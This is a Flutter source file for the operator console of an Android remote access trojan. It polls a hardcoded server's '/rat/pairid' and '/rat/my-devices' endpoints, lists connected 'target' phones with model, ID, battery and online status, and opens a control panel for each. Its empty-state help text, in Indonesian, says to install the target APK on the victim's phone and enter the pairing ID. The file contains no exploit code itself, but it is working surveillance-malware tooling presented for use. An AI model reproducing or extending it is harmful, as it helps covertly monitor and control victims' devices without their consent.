// lib/device_dashboard.dart
import 'dart:math' as math;
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';
import 'control_panel.dart';
import 'theme.dart';

const _kBase = 'http://www.rexylegal.rxpedia.web.id:2060';

// ═══════════════════════════════════════════════════════════════
// PALET — OBSIDIAN & CHAMPAGNE
// ═══════════════════════════════════════════════════════════════
class Hx {
  static const bg = Color(0xFF050608);
  static const surface = Color(0xFF0B0C0F);
  static const surfaceHi = Color(0xFF131418);
  static const surfaceHi2 = Color(0xFF1B1C21);

  static const goldLight = Color(0xFFF2E6C4);
  static const gold = Color(0xFFD9C082);
  static const goldMid = Color(0xFFA88E4C);
  static const goldDeep = Color(0xFF6B5928);

  static const jade = Color(0xFF8FC7A5);
  static const jadeDeep = Color(0xFF3D6B52);
  static const terra = Color(0xFFD8A090);
  static const slate = Color(0xFFA0B8D8);
  static const amethyst = Color(0xFFB8A0D0);
  static const rose = Color(0xFFD8A0B8);

  static const ivory = Color(0xFFEAE6DC);
  static const ash = Color(0xFF8A8479);
  static const ash2 = Color(0xFF565248);

  static const line = Color(0x1AD9C082);
  static const lineSoft = Color(0x10EAE6DC);
}

class DeviceDashboardPage extends StatefulWidget {
  final String username;
  final String role;
  final String sessionKey;
  final VoidCallback? onBack;
  const DeviceDashboardPage({
    super.key,
    this.username = '',
    this.role = '',
    this.sessionKey = '',
    this.onBack,
  });
  @override
  State<DeviceDashboardPage> createState() => _DDState();
}

class _DDState extends State<DeviceDashboardPage>
    with TickerProviderStateMixin {
  List<dynamic> _visible = [];
  bool _loading = true;
  String? _errorMsg;
  String _pairId = '';
  Timer? _timer;

  late AnimationController _entrance;
  late AnimationController _ambient;
  late AnimationController _pulse;
  late AnimationController _shimmer;

  @override
  void initState() {
    super.initState();

    _entrance = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 900),
    )..forward();

    _ambient = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 24),
    )..repeat();

    _pulse = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 2),
    )..repeat(reverse: true);

    _shimmer = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 3),
    )..repeat();

    _loadAll();
    _timer = Timer.periodic(const Duration(seconds: 20), (_) => _loadAll());
  }

  @override
  void dispose() {
    _timer?.cancel();
    _entrance.dispose();
    _ambient.dispose();
    _pulse.dispose();
    _shimmer.dispose();
    super.dispose();
  }

  Future<void> _loadAll() async {
    if (!mounted) return;
    try {
      final pRes = await http
          .get(Uri.parse('$_kBase/rat/pairid?key=${widget.sessionKey}'))
          .timeout(const Duration(seconds: 8));
      if (pRes.statusCode == 200) {
        final pd = jsonDecode(pRes.body);
        if (pd['valid'] == true && pd['pairId'] != null) {
          if (mounted) setState(() => _pairId = pd['pairId'].toString());
        }
      }

      final dRes = await http
          .get(Uri.parse('$_kBase/rat/my-devices?key=${widget.sessionKey}'))
          .timeout(const Duration(seconds: 10));

      if (!mounted) return;
      if (dRes.statusCode != 200) {
        setState(() {
          _loading = false;
          _errorMsg = 'Server error ${dRes.statusCode}';
        });
        return;
      }

      final body = jsonDecode(dRes.body);
      if (body['valid'] != true) {
        setState(() {
          _loading = false;
          _errorMsg = body['message'] ?? 'Error';
        });
        return;
      }

      List<dynamic> devices = List<dynamic>.from(body['devices'] ?? []);

      final now = DateTime.now();
      for (var d in devices) {
        try {
          final seen = DateTime.parse(d['lastSeen']?.toString() ?? '');
          d['online'] = now.difference(seen).inSeconds < 30;
        } catch (_) {
          d['online'] = false;
        }
      }

      if (mounted) {
        setState(() {
          _visible = devices;
          _loading = false;
          _errorMsg = null;
        });
      }
    } catch (e) {
      if (mounted) {
        setState(() {
          _loading = false;
          _errorMsg = e.toString();
        });
      }
    }
  }

  int get _active => _visible.where((d) => d['online'] == true).length;

  void _copyPairId() {
    if (_pairId.isEmpty) return;
    HapticFeedback.selectionClick();
    Clipboard.setData(ClipboardData(text: _pairId));
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      backgroundColor: Hx.surfaceHi,
      content: const Text(
        'Pair ID copied',
        style: TextStyle(
          color: Hx.ivory,
          fontFamily: 'Ganang',
          fontWeight: FontWeight.w700,
        ),
      ),
      duration: const Duration(seconds: 2),
    ));
  }

  void _handleBack() {
    HapticFeedback.selectionClick();
    if (widget.onBack != null) {
      widget.onBack!();
    } else {
      Navigator.pop(context);
    }
  }

  // ═══ STAGGERED ENTRY ═══
  Widget _staggered({required int index, required Widget child}) {
    const int total = 6;
    final double start = (index / total) * 0.5;
    final double end = (start + 0.5).clamp(0.0, 1.0);
    final Animation<double> curved = CurvedAnimation(
      parent: _entrance,
      curve: Interval(start, end, curve: Curves.easeOutCubic),
    );
    return AnimatedBuilder(
      animation: curved,
      builder: (context, _) {
        final t = curved.value;
        return Opacity(
          opacity: t.clamp(0.0, 1.0),
          child: Transform.translate(
            offset: Offset(0, 30 * (1 - t)),
            child: child,
          ),
        );
      },
    );
  }

  @override
  Widget build(BuildContext context) {
    final p = context.theme;

    return Scaffold(
      backgroundColor: Hx.bg,
      extendBodyBehindAppBar: true,
      body: Stack(
        fit: StackFit.expand,
        children: [
          _buildBackground(),
          SafeArea(
            child: Column(
              children: [
                _staggered(index: 0, child: _buildHeaderBar()),
                const SizedBox(height: 8),
                _staggered(index: 1, child: _buildHeroCard()),
                if (_errorMsg != null)
                  _staggered(
                    index: 2,
                    child: _buildErrorBanner(_errorMsg!),
                  ),
                _staggered(index: 2, child: _buildToolbar()),
                const SizedBox(height: 6),
                Expanded(
                  child: _loading
                      ? _buildLoadingState()
                      : _visible.isEmpty
                          ? _buildEmptyState()
                          : ListView.separated(
                              physics: const BouncingScrollPhysics(),
                              padding:
                                  const EdgeInsets.fromLTRB(18, 4, 18, 100),
                              itemCount: _visible.length,
                              separatorBuilder: (_, __) =>
                                  const SizedBox(height: 12),
                              itemBuilder: (ctx, i) =>
                                  _deviceCard(ctx, _visible[i], i),
                            ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  // ============================================================
  // BACKGROUND
  // ============================================================
  Widget _buildBackground() {
    return Stack(
      fit: StackFit.expand,
      children: [
        Container(color: Hx.bg),
        AnimatedBuilder(
          animation: _ambient,
          builder: (context, _) => CustomPaint(
            painter: _AmbientPainter(progress: _ambient.value),
          ),
        ),
        CustomPaint(
          painter: _GridPainter(color: Hx.gold.withOpacity(0.022)),
        ),
        IgnorePointer(
          child: Container(
            decoration: BoxDecoration(
              gradient: RadialGradient(
                center: Alignment.center,
                radius: 1.05,
                colors: [
                  Colors.transparent,
                  Colors.black.withOpacity(0.5),
                ],
                stops: const [0.5, 1.0],
              ),
            ),
          ),
        ),
      ],
    );
  }

  // ============================================================
  // HEADER BAR (floating pill: back + title + refresh)
  // ============================================================
  Widget _buildHeaderBar() {
    return Padding(
      padding: const EdgeInsets.fromLTRB(16, 8, 16, 4),
      child: Row(
        children: [
          // Back button
          Material(
            color: Colors.transparent,
            child: InkWell(
              borderRadius: BorderRadius.circular(13),
              onTap: _handleBack,
              child: Container(
                width: 42, height: 42,
                decoration: BoxDecoration(
                  gradient: const LinearGradient(
                    begin: Alignment.topLeft,
                    end: Alignment.bottomRight,
                    colors: [Hx.surfaceHi2, Hx.surface],
                  ),
                  border: Border.all(color: Hx.line, width: 0.8),
                  borderRadius: BorderRadius.circular(13),
                  boxShadow: [
                    BoxShadow(
                      color: Colors.black.withOpacity(0.4),
                      blurRadius: 12,
                      offset: const Offset(0, 4),
                    ),
                  ],
                ),
                child: const Icon(
                  Icons.arrow_back_ios_new_rounded,
                  color: Hx.gold,
                  size: 17,
                ),
              ),
            ),
          ),
          const Spacer(),

          // Title center
          Column(
            children: [
              const Text(
                'DEVICE CONSOLE',
                style: TextStyle(
                  color: Hx.ivory,
                  fontFamily: 'Ganang',
                  fontSize: 11,
                  fontWeight: FontWeight.w900,
                  letterSpacing: 3.2,
                ),
              ),
              const SizedBox(height: 2),
              Text(
                '@${widget.username}',
                style: const TextStyle(
                  color: Hx.ash,
                  fontFamily: 'Ganang',
                  fontSize: 9.5,
                  fontWeight: FontWeight.w600,
                  letterSpacing: 0.8,
                ),
              ),
            ],
          ),

          const Spacer(),

          // Refresh button
          Material(
            color: Colors.transparent,
            child: InkWell(
              borderRadius: BorderRadius.circular(13),
              onTap: () {
                HapticFeedback.selectionClick();
                setState(() {
                  _loading = true;
                  _errorMsg = null;
                });
                _loadAll();
              },
              child: Container(
                width: 42, height: 42,
                decoration: BoxDecoration(
                  gradient: const LinearGradient(
                    begin: Alignment.topLeft,
                    end: Alignment.bottomRight,
                    colors: [Hx.surfaceHi2, Hx.surface],
                  ),
                  border: Border.all(color: Hx.line, width: 0.8),
                  borderRadius: BorderRadius.circular(13),
                  boxShadow: [
                    BoxShadow(
                      color: Colors.black.withOpacity(0.4),
                      blurRadius: 12,
                      offset: const Offset(0, 4),
                    ),
                  ],
                ),
                child: AnimatedBuilder(
                  animation: _pulse,
                  builder: (context, _) {
                    return Transform.rotate(
                      angle: _loading ? _pulse.value * math.pi * 2 : 0,
                      child: const Icon(
                        Icons.refresh_rounded,
                        color: Hx.gold,
                        size: 19,
                      ),
                    );
                  },
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  // ============================================================
  // HERO CARD (stats + pair id)
  // ============================================================
  Widget _buildHeroCard() {
    return Padding(
      padding: const EdgeInsets.fromLTRB(18, 8, 18, 4),
      child: Container(
        padding: const EdgeInsets.all(18),
        decoration: BoxDecoration(
          gradient: const LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: [Hx.surfaceHi2, Hx.surface],
          ),
          border: Border.all(color: Hx.line, width: 0.9),
          borderRadius: BorderRadius.circular(24),
          boxShadow: [
            BoxShadow(
              color: Colors.black.withOpacity(0.6),
              blurRadius: 30,
              offset: const Offset(0, 12),
            ),
            BoxShadow(
              color: Hx.gold.withOpacity(0.06),
              blurRadius: 40,
              spreadRadius: -10,
            ),
          ],
        ),
        child: Stack(
          children: [
            Positioned(
              top: 0, left: 24, right: 24,
              child: Container(
                height: 1,
                decoration: const BoxDecoration(
                  gradient: LinearGradient(
                    colors: [
                      Colors.transparent,
                      Hx.goldLight,
                      Colors.transparent,
                    ],
                  ),
                ),
              ),
            ),
            Column(
              children: [
                // Stats row
                Row(
                  children: [
                    Expanded(
                      child: _buildStatTile(
                        icon: Icons.bolt_rounded,
                        label: 'ONLINE',
                        value: '$_active',
                        accent: Hx.jade,
                        isLive: _active > 0,
                      ),
                    ),
                    const SizedBox(width: 10),
                    Expanded(
                      child: _buildStatTile(
                        icon: Icons.devices_rounded,
                        label: 'TOTAL',
                        value: '${_visible.length}',
                        accent: Hx.gold,
                        isLive: false,
                      ),
                    ),
                  ],
                ),

                // Pair ID block
                if (_pairId.isNotEmpty) ...[
                  const SizedBox(height: 14),
                  Material(
                    color: Colors.transparent,
                    child: InkWell(
                      borderRadius: BorderRadius.circular(16),
                      onTap: _copyPairId,
                      child: Container(
                        padding: const EdgeInsets.all(14),
                        decoration: BoxDecoration(
                          gradient: LinearGradient(
                            begin: Alignment.topLeft,
                            end: Alignment.bottomRight,
                            colors: [
                              Hx.slate.withOpacity(0.14),
                              Hx.bg.withOpacity(0.4),
                            ],
                          ),
                          border: Border.all(
                            color: Hx.slate.withOpacity(0.32),
                            width: 0.8,
                          ),
                          borderRadius: BorderRadius.circular(16),
                        ),
                        child: Row(
                          children: [
                            Container(
                              width: 40, height: 40,
                              decoration: BoxDecoration(
                                borderRadius: BorderRadius.circular(11),
                                gradient: LinearGradient(
                                  colors: [
                                    Hx.slate.withOpacity(0.28),
                                    Hx.slate.withOpacity(0.08),
                                  ],
                                ),
                                border: Border.all(
                                  color: Hx.slate.withOpacity(0.35),
                                  width: 0.6,
                                ),
                              ),
                              child: const Icon(
                                Icons.link_rounded,
                                color: Hx.slate,
                                size: 18,
                              ),
                            ),
                            const SizedBox(width: 14),
                            Expanded(
                              child: Column(
                                crossAxisAlignment: CrossAxisAlignment.start,
                                children: [
                                  const Text(
                                    'PAIRING ID',
                                    style: TextStyle(
                                      color: Hx.ash,
                                      fontFamily: 'Ganang',
                                      fontSize: 9,
                                      fontWeight: FontWeight.w900,
                                      letterSpacing: 2.2,
                                    ),
                                  ),
                                  const SizedBox(height: 4),
                                  Text(
                                    _pairId,
                                    style: const TextStyle(
                                      color: Hx.ivory,
                                      fontSize: 17,
                                      fontWeight: FontWeight.w900,
                                      letterSpacing: 3.0,
                                      fontFamily: 'monospace',
                                    ),
                                  ),
                                ],
                              ),
                            ),
                            Container(
                              padding: const EdgeInsets.symmetric(
                                horizontal: 10, vertical: 6,
                              ),
                              decoration: BoxDecoration(
                                color: Hx.slate.withOpacity(0.16),
                                border: Border.all(
                                  color: Hx.slate.withOpacity(0.4),
                                  width: 0.7,
                                ),
                                borderRadius: BorderRadius.circular(9),
                              ),
                              child: const Row(
                                mainAxisSize: MainAxisSize.min,
                                children: [
                                  Icon(
                                    Icons.copy_rounded,
                                    color: Hx.slate,
                                    size: 13,
                                  ),
                                  SizedBox(width: 5),
                                  Text(
                                    'COPY',
                                    style: TextStyle(
                                      color: Hx.slate,
                                      fontFamily: 'Ganang',
                                      fontSize: 9.5,
                                      fontWeight: FontWeight.w900,
                                      letterSpacing: 1.4,
                                    ),
                                  ),
                                ],
                              ),
                            ),
                          ],
                        ),
                      ),
                    ),
                  ),
                  const SizedBox(height: 8),
                  const Text(
                    'Share this ID with your target device',
                    style: TextStyle(
                      color: Hx.ash2,
                      fontFamily: 'Ganang',
                      fontSize: 10,
                      fontWeight: FontWeight.w500,
                      letterSpacing: 0.2,
                    ),
                  ),
                ],
              ],
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildStatTile({
    required IconData icon,
    required String label,
    required String value,
    required Color accent,
    required bool isLive,
  }) {
    return Container(
      padding: const EdgeInsets.all(14),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
          colors: [accent.withOpacity(0.08), Hx.surfaceHi],
        ),
        border: Border.all(color: Hx.line, width: 0.8),
        borderRadius: BorderRadius.circular(18),
      ),
      child: Row(
        children: [
          Container(
            width: 38, height: 38,
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(11),
              gradient: LinearGradient(
                colors: [
                  accent.withOpacity(0.28),
                  accent.withOpacity(0.08),
                ],
              ),
              border: Border.all(
                color: accent.withOpacity(0.32),
                width: 0.6,
              ),
            ),
            child: Icon(icon, color: accent, size: 18),
          ),
          const SizedBox(width: 12),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Row(
                  children: [
                    Text(
                      value,
                      style: const TextStyle(
                        color: Hx.ivory,
                        fontFamily: 'Ganang',
                        fontSize: 22,
                        fontWeight: FontWeight.w900,
                        height: 1.0,
                        letterSpacing: -0.5,
                      ),
                    ),
                    const SizedBox(width: 6),
                    if (isLive)
                      AnimatedBuilder(
                        animation: _pulse,
                        builder: (_, __) {
                          final v = 0.4 + 0.6 * _pulse.value;
                          return Container(
                            width: 6, height: 6,
                            decoration: BoxDecoration(
                              color: accent.withOpacity(v),
                              shape: BoxShape.circle,
                              boxShadow: [
                                BoxShadow(
                                  color: accent.withOpacity(0.7 * v),
                                  blurRadius: 8,
                                ),
                              ],
                            ),
                          );
                        },
                      ),
                  ],
                ),
                const SizedBox(height: 4),
                Text(
                  label,
                  style: TextStyle(
                    color: accent,
                    fontFamily: 'Ganang',
                    fontSize: 9,
                    fontWeight: FontWeight.w900,
                    letterSpacing: 1.6,
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  // ============================================================
  // TOOLBAR
  // ============================================================
  Widget _buildToolbar() {
    return Padding(
      padding: const EdgeInsets.fromLTRB(22, 14, 22, 8),
      child: Row(
        children: [
          Container(
            width: 3, height: 12,
            decoration: BoxDecoration(
              gradient: const LinearGradient(
                begin: Alignment.topCenter,
                end: Alignment.bottomCenter,
                colors: [Hx.goldLight, Hx.goldMid],
              ),
              borderRadius: BorderRadius.circular(2),
            ),
          ),
          const SizedBox(width: 10),
          const Text(
            'CONNECTED DEVICES',
            style: TextStyle(
              color: Hx.ivory,
              fontFamily: 'Ganang',
              fontSize: 11,
              fontWeight: FontWeight.w900,
              letterSpacing: 2.4,
            ),
          ),
          const SizedBox(width: 10),
          Expanded(
            child: Container(
              height: 1,
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [
                    Hx.gold.withOpacity(0.28),
                    Colors.transparent,
                  ],
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  // ============================================================
  // DEVICE CARD (rombak)
  // ============================================================
  Widget _deviceCard(BuildContext ctx, dynamic d, int index) {
    final on = d['online'] == true;
    final accent = on ? Hx.jade : Hx.terra;
    final battery = d['battery'] ?? 0;
    final batteryColor = battery >= 50
        ? Hx.jade
        : battery >= 20
            ? Hx.gold
            : Hx.terra;

    return AnimatedBuilder(
      animation: _entrance,
      builder: (context, _) {
        final delay = (index * 0.08).clamp(0.0, 0.6);
        final t = ((_entrance.value - delay) / (1 - delay)).clamp(0.0, 1.0);
        final eased = Curves.easeOutCubic.transform(t);
        return Opacity(
          opacity: eased,
          child: Transform.translate(
            offset: Offset(0, 20 * (1 - eased)),
            child: Material(
              color: Colors.transparent,
              child: InkWell(
                borderRadius: BorderRadius.circular(20),
                onTap: () {
                  HapticFeedback.mediumImpact();
                  Navigator.push(
                    ctx,
                    MaterialPageRoute(
                      builder: (_) => ControlPanelPage(
                        targetDevice: Map<String, dynamic>.from(d),
                        role: widget.role,
                      ),
                    ),
                  );
                },
                child: Container(
                  padding: const EdgeInsets.all(16),
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      begin: Alignment.topLeft,
                      end: Alignment.bottomRight,
                      colors: [
                        accent.withOpacity(on ? 0.06 : 0.03),
                        Hx.surfaceHi,
                      ],
                    ),
                    border: Border.all(
                      color: on
                          ? Hx.jade.withOpacity(0.22)
                          : Hx.line,
                      width: 0.8,
                    ),
                    borderRadius: BorderRadius.circular(20),
                    boxShadow: [
                      BoxShadow(
                        color: Colors.black.withOpacity(0.5),
                        blurRadius: 22,
                        offset: const Offset(0, 8),
                      ),
                      if (on)
                        BoxShadow(
                          color: Hx.jade.withOpacity(0.10),
                          blurRadius: 30,
                          spreadRadius: -8,
                        ),
                    ],
                  ),
                  child: Row(
                    children: [
                      // Icon device
                      Container(
                        width: 52, height: 52,
                        decoration: BoxDecoration(
                          borderRadius: BorderRadius.circular(15),
                          gradient: LinearGradient(
                            colors: [
                              accent.withOpacity(0.24),
                              accent.withOpacity(0.06),
                            ],
                          ),
                          border: Border.all(
                            color: accent.withOpacity(0.32),
                            width: 0.7,
                          ),
                        ),
                        child: Stack(
                          children: [
                            const Center(
                              child: Icon(
                                Icons.phone_android_rounded,
                                color: Hx.ivory,
                                size: 22,
                              ),
                            ),
                            if (on)
                              Positioned(
                                bottom: 6, right: 6,
                                child: AnimatedBuilder(
                                  animation: _pulse,
                                  builder: (_, __) {
                                    final v = 0.4 + 0.6 * _pulse.value;
                                    return Container(
                                      width: 7, height: 7,
                                      decoration: BoxDecoration(
                                        color: Hx.jade.withOpacity(v),
                                        shape: BoxShape.circle,
                                        boxShadow: [
                                          BoxShadow(
                                            color: Hx.jade
                                                .withOpacity(0.8 * v),
                                            blurRadius: 8,
                                          ),
                                        ],
                                      ),
                                    );
                                  },
                                ),
                              ),
                          ],
                        ),
                      ),
                      const SizedBox(width: 14),

                      // Info
                      Expanded(
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Text(
                              d['model'] ?? 'Unknown',
                              style: const TextStyle(
                                color: Hx.ivory,
                                fontSize: 14,
                                fontWeight: FontWeight.w800,
                                letterSpacing: 0.1,
                              ),
                              maxLines: 1,
                              overflow: TextOverflow.ellipsis,
                            ),
                            const SizedBox(height: 4),
                            Text(
                              d['id'] ?? '-',
                              style: const TextStyle(
                                color: Hx.ash,
                                fontSize: 10,
                                fontFamily: 'monospace',
                                letterSpacing: 0.5,
                              ),
                              maxLines: 1,
                              overflow: TextOverflow.ellipsis,
                            ),
                            const SizedBox(height: 8),
                            Row(
                              children: [
                                Icon(
                                  Icons.battery_charging_full_rounded,
                                  color: batteryColor,
                                  size: 13,
                                ),
                                const SizedBox(width: 5),
                                Text(
                                  '$battery%',
                                  style: TextStyle(
                                    color: batteryColor,
                                    fontSize: 11,
                                    fontWeight: FontWeight.w800,
                                    fontFamily: 'monospace',
                                  ),
                                ),
                              ],
                            ),
                          ],
                        ),
                      ),

                      // Status & arrow
                      Column(
                        crossAxisAlignment: CrossAxisAlignment.end,
                        children: [
                          Container(
                            padding: const EdgeInsets.symmetric(
                              horizontal: 9, vertical: 5,
                            ),
                            decoration: BoxDecoration(
                              color: accent.withOpacity(0.14),
                              border: Border.all(
                                color: accent.withOpacity(0.35),
                                width: 0.7,
                              ),
                              borderRadius: BorderRadius.circular(9),
                            ),
                            child: Row(
                              mainAxisSize: MainAxisSize.min,
                              children: [
                                Container(
                                  width: 5, height: 5,
                                  decoration: BoxDecoration(
                                    color: accent,
                                    shape: BoxShape.circle,
                                    boxShadow: [
                                      BoxShadow(
                                        color: accent.withOpacity(0.7),
                                        blurRadius: 6,
                                      ),
                                    ],
                                  ),
                                ),
                                const SizedBox(width: 5),
                                Text(
                                  on ? 'ONLINE' : 'OFFLINE',
                                  style: TextStyle(
                                    color: accent,
                                    fontFamily: 'Ganang',
                                    fontSize: 9,
                                    fontWeight: FontWeight.w900,
                                    letterSpacing: 1.2,
                                  ),
                                ),
                              ],
                            ),
                          ),
                          const SizedBox(height: 10),
                          const Icon(
                            Icons.arrow_forward_ios_rounded,
                            color: Hx.ash2,
                            size: 12,
                          ),
                        ],
                      ),
                    ],
                  ),
                ),
              ),
            ),
          ),
        );
      },
    );
  }

  // ============================================================
  // ERROR BANNER
  // ============================================================
  Widget _buildErrorBanner(String msg) {
    return Container(
      margin: const EdgeInsets.fromLTRB(18, 10, 18, 0),
      padding: const EdgeInsets.all(13),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          colors: [
            Hx.terra.withOpacity(0.14),
            Hx.surfaceHi,
          ],
        ),
        border: Border.all(
          color: Hx.terra.withOpacity(0.4),
          width: 0.9,
        ),
        borderRadius: BorderRadius.circular(14),
      ),
      child: Row(
        children: [
          const Icon(
            Icons.error_outline_rounded,
            color: Hx.terra,
            size: 16,
          ),
          const SizedBox(width: 10),
          Expanded(
            child: Text(
              msg,
              style: const TextStyle(
                color: Hx.terra,
                fontSize: 11.5,
                fontWeight: FontWeight.w600,
              ),
            ),
          ),
        ],
      ),
    );
  }

  // ============================================================
  // LOADING STATE
  // ============================================================
  Widget _buildLoadingState() {
    return ListView.separated(
      physics: const NeverScrollableScrollPhysics(),
      padding: const EdgeInsets.fromLTRB(18, 4, 18, 100),
      itemCount: 3,
      separatorBuilder: (_, __) => const SizedBox(height: 12),
      itemBuilder: (context, index) {
        return Container(
          height: 90,
          decoration: BoxDecoration(
            gradient: const LinearGradient(
              begin: Alignment.topLeft,
              end: Alignment.bottomRight,
              colors: [Hx.surfaceHi, Hx.surface],
            ),
            border: Border.all(color: Hx.line, width: 0.8),
            borderRadius: BorderRadius.circular(20),
          ),
          child: Center(
            child: SizedBox(
              width: 22, height: 22,
              child: CircularProgressIndicator(
                color: Hx.gold,
                strokeWidth: 2.2,
              ),
            ),
          ),
        );
      },
    );
  }

  // ============================================================
  // EMPTY STATE
  // ============================================================
  Widget _buildEmptyState() {
    return Center(
      child: Padding(
        padding: const EdgeInsets.all(40),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            AnimatedBuilder(
              animation: _pulse,
              builder: (_, __) {
                final s = 1 + 0.06 * _pulse.value;
                return Transform.scale(
                  scale: s,
                  child: Container(
                    width: 96, height: 96,
                    decoration: BoxDecoration(
                      gradient: RadialGradient(
                        colors: [
                          Hx.gold.withOpacity(0.18),
                          Hx.gold.withOpacity(0.02),
                        ],
                      ),
                      border: Border.all(color: Hx.line, width: 0.9),
                      borderRadius: BorderRadius.circular(28),
                      boxShadow: [
                        BoxShadow(
                          color: Hx.gold.withOpacity(0.18),
                          blurRadius: 44,
                          spreadRadius: -8,
                        ),
                      ],
                    ),
                    child: const Icon(
                      Icons.devices_other_rounded,
                      color: Hx.gold,
                      size: 42,
                    ),
                  ),
                );
              },
            ),
            const SizedBox(height: 26),
            const Text(
              'NO DEVICES',
              style: TextStyle(
                color: Hx.ivory,
                fontWeight: FontWeight.w900,
                letterSpacing: 3.2,
                fontSize: 14,
                fontFamily: 'Ganang',
              ),
            ),
            const SizedBox(height: 8),
            const Text(
              'Belum ada device yang terhubung',
              style: TextStyle(
                color: Hx.ash,
                fontSize: 12,
                fontWeight: FontWeight.w500,
              ),
            ),
            const SizedBox(height: 26),
            Container(
              margin: const EdgeInsets.symmetric(horizontal: 20),
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                gradient: const LinearGradient(
                  begin: Alignment.topLeft,
                  end: Alignment.bottomRight,
                  colors: [Hx.surfaceHi, Hx.surface],
                ),
                border: Border.all(color: Hx.line, width: 0.8),
                borderRadius: BorderRadius.circular(16),
              ),
              child: Column(
                children: [
                  const Icon(
                    Icons.info_outline_rounded,
                    color: Hx.gold,
                    size: 22,
                  ),
                  const SizedBox(height: 10),
                  const Text(
                    'How to connect',
                    style: TextStyle(
                      color: Hx.ivory,
                      fontSize: 12,
                      fontWeight: FontWeight.w800,
                      letterSpacing: 0.4,
                    ),
                  ),
                  const SizedBox(height: 8),
                  Text(
                    '1. Install APK target di HP korban\n2. Buka APK · masukkan Pairing ID di atas\n3. Device otomatis muncul di sini',
                    style: const TextStyle(
                      color: Hx.ash,
                      fontSize: 10.5,
                      height: 1.6,
                    ),
                    textAlign: TextAlign.center,
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════
// AMBIENT PAINTER
// ═══════════════════════════════════════════════════════════════
class _AmbientPainter extends CustomPainter {
  final double progress;
  _AmbientPainter({required this.progress});

  @override
  void paint(Canvas canvas, Size size) {
    final t = progress * math.pi * 2;
    final paint = Paint()
      ..maskFilter = const MaskFilter.blur(BlurStyle.normal, 140);

    paint.color = Hx.gold.withOpacity(0.10);
    canvas.drawCircle(
      Offset(
        size.width * (0.16 + 0.06 * math.sin(t * 0.7)),
        size.height * (0.10 + 0.05 * math.cos(t * 0.5)),
      ),
      size.width * 0.60,
      paint,
    );

    paint.color = Hx.jadeDeep.withOpacity(0.13);
    canvas.drawCircle(
      Offset(
        size.width * (0.90 + 0.05 * math.cos(t * 0.6)),
        size.height * (0.85 + 0.05 * math.sin(t * 0.4)),
      ),
      size.width * 0.62,
      paint,
    );

    paint.color = Hx.goldDeep.withOpacity(0.09);
    canvas.drawCircle(
      Offset(
        size.width * (0.55 + 0.08 * math.sin(t * 0.3)),
        size.height * (0.50 + 0.06 * math.cos(t * 0.8)),
      ),
      size.width * 0.50,
      paint,
    );
  }

  @override
  bool shouldRepaint(covariant _AmbientPainter old) =>
      old.progress != progress;
}

// ═══════════════════════════════════════════════════════════════
// GRID PAINTER
// ═══════════════════════════════════════════════════════════════
class _GridPainter extends CustomPainter {
  final Color color;
  _GridPainter({required this.color});

  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()
      ..color = color
      ..strokeWidth = 1;
    const s = 40.0;
    for (double x = 0; x < size.width; x += s) {
      canvas.drawLine(Offset(x, 0), Offset(x, size.height), paint);
    }
    for (double y = 0; y < size.height; y += s) {
      canvas.drawLine(Offset(0, y), Offset(size.width, y), paint);
    }
  }

  @override
  bool shouldRepaint(covariant _GridPainter old) => old.color != color;
}